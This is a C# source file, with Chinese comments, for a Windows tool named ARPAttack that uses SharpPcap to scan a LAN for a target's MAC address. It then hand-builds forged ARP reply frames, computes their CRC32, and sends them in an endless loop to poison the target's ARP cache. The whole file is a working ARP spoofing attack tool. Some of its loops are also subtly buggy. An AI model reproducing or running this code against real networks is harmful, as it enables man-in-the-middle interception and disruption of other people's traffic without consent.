using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ARPAttack
{
    class ARPTool
    {

        private LibPcapLiveDevice _device;  //设备

        public IPAddress LocalIP { get; private set; }  //本机IP

        public IPAddress GetwayIP { get; private set; } //网关IP

        public PhysicalAddress LocalMAC { get; private set; }   //本机MAC

        public PhysicalAddress GetwayMAC { get; private set; }  //网关MAC

        private TimeSpan timeout = new TimeSpan(0, 0, 1);   //扫面线程超时事件

        /// <summary>
        /// 扫描线程
        /// </summary>
        private Thread scanThread = null;

        /// <summary>
        /// 发送线程
        /// </summary>
        private Thread sendThread = null;

        /// <summary>
        /// 欺骗数据包
        /// </summary>
        byte[] packet;

        int time = 0;   //发包次数

        byte[] mIP;
        byte[] sIP;
        byte[] mMAC;
        byte[] sMAC;

        public event EventHandler<PhysicalAddress> ResolvedEvent;   //UI更新事件 -更新靶机MAC
        public event EventHandler<int> ResolvedTimeEvent;   //UI更新事件 -更新欺骗包发送次数
        public event EventHandler<EventArgs> ScanStopedEvent;   //扫描结束事件

        /// <summary>
        /// Constructs a new ARP Resolver 构造一个新的ARP解析器 
        /// </summary>
        /// <param name="device">The network device on which this resolver sends its ARP packets 该解析器发送ARP数据包的网络设备 </param>
        public ARPTool(LibPcapLiveDevice device)
        {
            _device = device;

            foreach (var address in _device.Addresses)
            {
                if (address.Addr.type == Sockaddr.AddressTypes.AF_INET_AF_INET6)
                {
                    // make sure the address is ipv4 确保地址是IPv4 
                    if (address.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        LocalIP = address.Addr.ipAddress;
                        break; // break out of the foreach 跳出循环
                    }
                }
            }

            foreach (var address in device.Addresses)
            {
                if (address.Addr.type == Sockaddr.AddressTypes.HARDWARE)
                {
                    LocalMAC = address.Addr.hardwareAddress; // 本机MAC
                }
            }

            GetwayIP = _device.Interface.GatewayAddress; // 网关IP
            GetwayMAC = Resolve(GetwayIP); // 网关MAC
        }

        /// <summary>
        /// arp欺骗：对内网PC进行欺骗
        /// </summary>
        /// <param name="getwayIP"></param>
        /// <param name="wrongMac"></param>
        /// <param name="destIP"></param>
        /// <param name="destMac"></param>
        public void StartARPSpoofing(string senderIP, string recipientIP,string senderMAC,string recipientMAC)
        {
            mIP = IPTOBYTE(recipientIP);
            sIP = IPTOBYTE(senderIP);
            mMAC = MACTOBYTE(recipientMAC);
            sMAC = MACTOBYTE(senderMAC);

            //构造ARP欺骗包
            packet = getPacket(sIP, mIP, sMAC, mMAC);

            //初始化发包线程
            sendThread = new Thread(SendPack);
            //启动线程
            sendThread.Start();
        }

        /// <summary>
        /// 停止ARP欺骗
        /// </summary>
        public void StopARPSpoofing() {
            //发包线程不为空，且发包线程处于运行中
            if (sendThread != null && sendThread.ThreadState != ThreadState.Unstarted)
            {
                sendThread.Abort();
                if (_device.Opened)
                    _device.Close();
            }
        }

        /// <summary>
        /// 停止扫描
        /// </summary>
        public void StopScanLan()
        {
            //扫描线程不为空且线程处于运行状态
            if (scanThread != null && scanThread.ThreadState == ThreadState.Running)
            {
                //强制关闭线程
                scanThread.Abort();
                //关闭设备
                if (_device.Opened) _device.Close();
            }
        }

        /// <summary>
        /// 发送数据
        /// </summary>
        public void SendPack()
        {
            _device.Open();
            var timeoutDateTime = DateTime.Now + timeout;

            //发送数据包
            while (true)
            {
                _device.SendPacket(packet);
                time++;
                // 通知事件 -更新发包次数
                if (ResolvedEvent != null)
                {
                    ResolvedTimeEvent(this, time);
                }
                Thread.Sleep(100);  //线程休眠100ms
            }

        }

        /// <summary>
        /// 发送ARP请求包，根据返回的应答包获取MAC地址
        /// </summary>
        public void ScanLAN(string recipientIP,string senderMAC,string senderIP)
        {
            // 构造Arp请求包
            var arpPackets = BuildRequest(IPAddress.Parse(recipientIP), PhysicalAddress.Parse(senderMAC), IPAddress.Parse(senderIP));

            //创建一个“tcpdump”过滤器，只允许读取arp回复
            String arpFilter = "arp and ether dst " + senderMAC;

            //open the device with 20ms timeout 打开设备，设置超时时间20ms
            _device.Open(DeviceMode.Promiscuous, 20);

            //set the filter    设置过滤器
            _device.Filter = arpFilter;

            //初始化扫描线程
            scanThread = new Thread(() =>
            {
                var lastRequestTime = DateTime.FromBinary(0);
                var requestInterval = new TimeSpan(0, 0, 1);
                var timeoutDateTime = DateTime.Now + timeout;
                while (DateTime.Now < timeoutDateTime)
                {
                    if (requestInterval < (DateTime.Now - lastRequestTime))
                    {
                        // inject the packet to the wire 发送请求包
                        _device.SendPacket(arpPackets);
                        MessageBox.Show("已发送");
                        lastRequestTime = DateTime.Now;
                    }

                    //read the next packet from the network
                    var reply = _device.GetNextPacket();    //获取网卡中的下一个包，过滤出ARP

                    if (reply == null)  //下一个包为空时，跳过本次循环
                    {
                        continue;
                    }

                    // parse the packet 解析数据包
                    var packet = PacketDotNet.Packet.ParsePacket(reply.LinkLayerType, reply.Data);

                    // is this an arp packet? 这是一个arp数据包吗？
                    var arpPacket = PacketDotNet.ARPPacket.GetEncapsulated(packet);
                    if (arpPacket == null)
                    {
                        continue;
                    }

                    //if this is the reply we're looking for, stop  //ARP包中的源主机IP 等于 UI中的目标主机IP
                    if (arpPacket.SenderProtocolAddress.ToString().Equals(recipientIP))
                    {
                        MessageBox.Show("已找到");
                        // 通知事件 -更新靶机MAC
                        if (ResolvedEvent != null)
                        {
                            ResolvedEvent(this, arpPacket.SenderHardwareAddress);
                        }
                        break;
                    }
                }

                _device.Close();    //关闭设备
            });
            scanThread.Start(); //启动线程
        }

        /// <summary>
        /// 获取响应数据包
        /// </summary>
        /// <returns></returns>
        public byte[] getPacket(byte[] yIP, byte[] mIP, byte[] yMAC, byte[] mMAC)
        {
            //ARP应答数据包
            byte[] packet = new byte[] {
                //以太网首部
                0xe0, 0xcb, 0x4e, 0x2f, 0x8a, 0xc7,//目标主机MAC地址      0
                0x00, 0x23, 0xcd, 0x34, 0x20,0x0e,//源主机MAC地址         6
                0x08, 0x06,//帧类型（上层协议类型）ARP请求或应答          12
                
                //ARP帧
                0x00, 0x01,//硬件类型 1表示以太网                         14
                0x08, 0x00,//协议类型 0800表示IP地址                      16
                0x06,//发送端以太网地址长度 6                             18
                0x04,//发送端IP地址长度 4                                 19
                0x00, 0x02,//OP 01请求 02应答                             20
                0x00, 0x23, 0xcd, 0x34, 0x20, 0x0e, //发送端硬件地址      22
                0xc0, 0xa8, 0x01, 0x01, 0xe0, 0xcb, //发送端协议（IP）地址28
                0x4e, 0x2f, 0x8a, 0xc7, 0xc0, 0xa8,//目的端硬件地址       34
                0x01, 0x63, 0x00, 0x00, 0x00, 0x00,//目的端协议（IP）地址 40

                //剩余18位填充字节没有意义。
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

                //FCS校验码
                //0x00, 0x00, 0x00, 0x00
            };

            //循环替换IP
            for (int i = 0; i < 4; i++)
            {
                packet[i + 28] = yIP[i];


                packet[i + 40] = mIP[i];
            }

            //循环替换MAC
            for (int i = 0; i < 6; i++)
            {
                packet[i] = mMAC[i];
                packet[i + 6] = yMAC[i];
                packet[i + 22] = yMAC[i];
                packet[i + 34] = mMAC[i];
            }

            //return packet;

            //FCS校验

            //定义一个包，长度加4 便于加入FCS校验码
            byte[] p1 = new byte[packet.Length + 4];

            //复制填充好IP和MAC的包
            for (int i = 0; i < packet.Length - 1; i++)
            {
                p1[i] = packet[i];
            }

            //计算CRC32校验码
            UInt32 u = GetCRC32(packet);

            byte[] crc = new byte[4];
            
            //Uint转Byte[4] CRC32 is Unit To Byte[4]
            crc[0] = (byte)(u >> 24);
            crc[1] = (byte)(u >> 16);
            crc[2] = (byte)(u >> 8);
            crc[3] = (byte)(u);

            //填充FCS校验位
            for (int i = 0; i < crc.Length; i++)
            {
                p1[p1.Length - 1 - 4 + i] = crc[i];
            }

            return p1;
        }

        //CRC32计算表
        UInt32[] crcTable =
        {

          0x00000000, 0x04c11db7, 0x09823b6e, 0x0d4326d9, 0x130476dc, 0x17c56b6b, 0x1a864db2, 0x1e475005,

          0x2608edb8, 0x22c9f00f, 0x2f8ad6d6, 0x2b4bcb61, 0x350c9b64, 0x31cd86d3, 0x3c8ea00a, 0x384fbdbd,

          0x4c11db70, 0x48d0c6c7, 0x4593e01e, 0x4152fda9, 0x5f15adac, 0x5bd4b01b, 0x569796c2, 0x52568b75,

          0x6a1936c8, 0x6ed82b7f, 0x639b0da6, 0x675a1011, 0x791d4014, 0x7ddc5da3, 0x709f7b7a, 0x745e66cd,

          0x9823b6e0, 0x9ce2ab57, 0x91a18d8e, 0x95609039, 0x8b27c03c, 0x8fe6dd8b, 0x82a5fb52, 0x8664e6e5,

          0xbe2b5b58, 0xbaea46ef, 0xb7a96036, 0xb3687d81, 0xad2f2d84, 0xa9ee3033, 0xa4ad16ea, 0xa06c0b5d,

          0xd4326d90, 0xd0f37027, 0xddb056fe, 0xd9714b49, 0xc7361b4c, 0xc3f706fb, 0xceb42022, 0xca753d95,

          0xf23a8028, 0xf6fb9d9f, 0xfbb8bb46, 0xff79a6f1, 0xe13ef6f4, 0xe5ffeb43, 0xe8bccd9a, 0xec7dd02d,

          0x34867077, 0x30476dc0, 0x3d044b19, 0x39c556ae, 0x278206ab, 0x23431b1c, 0x2e003dc5, 0x2ac12072,

          0x128e9dcf, 0x164f8078, 0x1b0ca6a1, 0x1fcdbb16, 0x018aeb13, 0x054bf6a4, 0x0808d07d, 0x0cc9cdca,

          0x7897ab07, 0x7c56b6b0, 0x71159069, 0x75d48dde, 0x6b93dddb, 0x6f52c06c, 0x6211e6b5, 0x66d0fb02,

          0x5e9f46bf, 0x5a5e5b08, 0x571d7dd1, 0x53dc6066, 0x4d9b3063, 0x495a2dd4, 0x44190b0d, 0x40d816ba,

          0xaca5c697, 0xa864db20, 0xa527fdf9, 0xa1e6e04e, 0xbfa1b04b, 0xbb60adfc, 0xb6238b25, 0xb2e29692,

          0x8aad2b2f, 0x8e6c3698, 0x832f1041, 0x87ee0df6, 0x99a95df3, 0x9d684044, 0x902b669d, 0x94ea7b2a,

          0xe0b41de7, 0xe4750050, 0xe9362689, 0xedf73b3e, 0xf3b06b3b, 0xf771768c, 0xfa325055, 0xfef34de2,

          0xc6bcf05f, 0xc27dede8, 0xcf3ecb31, 0xcbffd686, 0xd5b88683, 0xd1799b34, 0xdc3abded, 0xd8fba05a,

          0x690ce0ee, 0x6dcdfd59, 0x608edb80, 0x644fc637, 0x7a089632, 0x7ec98b85, 0x738aad5c, 0x774bb0eb,

          0x4f040d56, 0x4bc510e1, 0x46863638, 0x42472b8f, 0x5c007b8a, 0x58c1663d, 0x558240e4, 0x51435d53,

          0x251d3b9e, 0x21dc2629, 0x2c9f00f0, 0x285e1d47, 0x36194d42, 0x32d850f5, 0x3f9b762c, 0x3b5a6b9b,

          0x0315d626, 0x07d4cb91, 0x0a97ed48, 0x0e56f0ff, 0x1011a0fa, 0x14d0bd4d, 0x19939b94, 0x1d528623,

          0xf12f560e, 0xf5ee4bb9, 0xf8ad6d60, 0xfc6c70d7, 0xe22b20d2, 0xe6ea3d65, 0xeba91bbc, 0xef68060b,

          0xd727bbb6, 0xd3e6a601, 0xdea580d8, 0xda649d6f, 0xc423cd6a, 0xc0e2d0dd, 0xcda1f604, 0xc960ebb3,

          0xbd3e8d7e, 0xb9ff90c9, 0xb4bcb610, 0xb07daba7, 0xae3afba2, 0xaafbe615, 0xa7b8c0cc, 0xa379dd7b,

          0x9b3660c6, 0x9ff77d71, 0x92b45ba8, 0x9675461f, 0x8832161a, 0x8cf30bad, 0x81b02d74, 0x857130c3,

          0x5d8a9099, 0x594b8d2e, 0x5408abf7, 0x50c9b640, 0x4e8ee645, 0x4a4ffbf2, 0x470cdd2b, 0x43cdc09c,

          0x7b827d21, 0x7f436096, 0x7200464f, 0x76c15bf8, 0x68860bfd, 0x6c47164a, 0x61043093, 0x65c52d24,

          0x119b4be9, 0x155a565e, 0x18197087, 0x1cd86d30, 0x029f3d35, 0x065e2082, 0x0b1d065b, 0x0fdc1bec,

          0x3793a651, 0x3352bbe6, 0x3e119d3f, 0x3ad08088, 0x2497d08d, 0x2056cd3a, 0x2d15ebe3, 0x29d4f654,

          0xc5a92679, 0xc1683bce, 0xcc2b1d17, 0xc8ea00a0, 0xd6ad50a5, 0xd26c4d12, 0xdf2f6bcb, 0xdbee767c,

          0xe3a1cbc1, 0xe760d676, 0xea23f0af, 0xeee2ed18, 0xf0a5bd1d, 0xf464a0aa, 0xf9278673, 0xfde69bc4,

          0x89b8fd09, 0x8d79e0be, 0x803ac667, 0x84fbdbd0, 0x9abc8bd5, 0x9e7d9662, 0x933eb0bb, 0x97ffad0c,

          0xafb010b1, 0xab710d06, 0xa6322bdf, 0xa2f33668, 0xbcb4666d, 0xb8757bda, 0xb5365d03, 0xb1f740b4

        };

        /// <summary>
        /// 计算CRC32码
        /// </summary>
        /// <param name="bytes"></param>
        /// <returns></returns>
        public uint GetCRC32(byte[] bytes)
        {

            uint iCount = (uint)bytes.Length;

            uint crc = 0xFFFFFFFF;

            for (uint i = 0; i < iCount; i++)
            {

                crc = (crc << 8) ^ crcTable[(crc >> 24) ^ bytes[i]];

            }
            
            return crc;
        }

        /// <summary>
        /// 获取网关IP
        /// </summary>
        /// <param name="destIP"></param>
        /// <returns></returns>
        public PhysicalAddress Resolve(IPAddress destIP)
        {
            //构造ARP请求包
            //var request = getSenderPacket(IPTOBYTE(LocalIP.ToString()), IPTOBYTE(destIP.ToString()),MACTOBYTE( LocalMAC.ToString()));

            var request = BuildRequest(destIP,LocalMAC,LocalIP);

            //创建一个只允许读取ARP回复的“TCPDUMP”过滤器
            String arpFilter = "arp and ether dst " + LocalMAC.ToString();

            //打开设备设置20ms的超时
            _device.Open(DeviceMode.Promiscuous, 20);

            //设置过滤器
            _device.Filter = arpFilter;

            // set a last request time that will trigger sending the
            // arp request immediately
            var lastRequestTime = DateTime.FromBinary(0);

            var requestInterval = new TimeSpan(0, 0, 1);

            PacketDotNet.ARPPacket arpPacket = null;

            // 尝试用当前超时解析地址 
            var timeoutDateTime = DateTime.Now + timeout;
            while (DateTime.Now < timeoutDateTime)
            {
                if (requestInterval < (DateTime.Now - lastRequestTime))
                {
                    // inject the packet to the wire
                    _device.SendPacket(request);
                    lastRequestTime = DateTime.Now;
                }

                //read the next packet from the network
                var reply = _device.GetNextPacket();
                if (reply == null)
                {
                    continue;
                }

                // parse the packet
                var packet = Packet.ParsePacket(reply.LinkLayerType, reply.Data);

                // is this an arp packet?
                arpPacket = ARPPacket.GetEncapsulated(packet);
                if (arpPacket == null)
                {
                    continue;
                }

                //if this is the reply we're looking for, stop
                if (arpPacket.SenderProtocolAddress.Equals(destIP))
                {
                    break;
                }
            }

            // free the device
            _device.Close();

            // the timeout happened
            if (DateTime.Now >= timeoutDateTime)
            {
                return null;
            }
            else
            {
                //return the resolved MAC address
                return arpPacket.SenderHardwareAddress;
            }
        }

        /// <summary>
        /// IP转换成
        /// </summary>
        /// <returns></returns>
        private byte[] IPTOBYTE(string ipstr)
        {
            IPAddress ip;
            bool b = IPAddress.TryParse(ipstr, out ip);

            return ip.GetAddressBytes();
        }

        /// <summary>
        /// 将MAC地址转换成byte[]
        /// </summary>
        /// <returns></returns>
        private byte[] MACTOBYTE(string macStr)
        {
            //MessageBox.Show(macStr);
            //macStr = Regex.Replace(macStr, @".{2}", "$0-").Trim('-');

            string[] macList = macStr.Split('-');

            byte[] macBytes = new byte[6];
            for (int i = 0; i < 6; i++)
            {
                macBytes[i] = (byte)Convert.ToInt32(macList[i], 16);
            }
            return macBytes;

        }

        /// <summary>
        /// 获取请求数据包
        /// </summary>
        /// <returns></returns>
        public byte[] getSenderPacket(byte[] yIP, byte[] mIP, byte[] yMAC)
        {
            //ARP请求数据包
            byte[] packet = new byte[] {
                //以太网首部
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff,//目标主机MAC地址      0
                0x00, 0x23, 0xcd, 0x34, 0x20, 0x0e,//源主机MAC地址         6
                0x08, 0x06,//帧类型（上层协议类型）ARP请求或应答          12
                
                //ARP帧
                0x00, 0x01,//硬件类型 1表示以太网                         14
                0x08, 0x00,//协议类型 0800表示IP地址                      16
                0x06,//发送端以太网地址长度 6                             18
                0x04,//发送端IP地址长度 4                                 19
                0x00, 0x01,//OP 01请求 02应答                             20
                0x00, 0x23, 0xcd, 0x34, 0x20, 0x0e, //发送端硬件地址      22
                0xc0, 0xa8, 0x01, 0x01, 0xe0, 0xcb, //发送端协议（IP）地址28
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,//目的端硬件地址       34
                0x01, 0x63, 0x00, 0x00, 0x00, 0x00,//目的端协议（IP）地址 40

                //剩余18位填充字节没有意义。
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };

            //循环替换IP
            for (int i = 0; i < 4; i++)
            {
                packet[i + 28] = yIP[i];


                packet[i + 40] = mIP[i];
            }

            for (int i = 0; i < yMAC[i]; i++)
            {
                MessageBox.Show(yMAC[i].ToString());
            }

            //循环替换MAC
            for (int i = 0; i < 6; i++)
            {
                packet[i + 6] = yMAC[i];
                packet[i + 22] = yMAC[i];
            }

            return packet;
        }

        /// <summary>
        /// 构造ARP请求包
        /// </summary>
        /// <param name="destinationIP">目标主机IP</param>
        /// <param name="localMac">源主机MAC</param>
        /// <param name="localIP">源主机IP</param>
        /// <returns></returns>
        private Packet BuildRequest(IPAddress destinationIP, PhysicalAddress localMac, IPAddress localIP)
        {
            // an arp packet is inside of an ethernet packet 构造以太网帧
            var ethernetPacket = new EthernetPacket(localMac,
                                                    PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                                                    PacketDotNet.EthernetPacketType.Arp);

            //构造ARP报文
            var arpPacket = new ARPPacket(PacketDotNet.ARPOperation.Request,
                                          PhysicalAddress.Parse("00-00-00-00-00-00"),
                                          destinationIP,
                                          localMac,
                                          localIP);

            // the arp packet is the payload of the ethernet packet 把ARP报文填入以太网帧
            ethernetPacket.PayloadPacket = arpPacket; 
            return ethernetPacket;
        }
    }
}
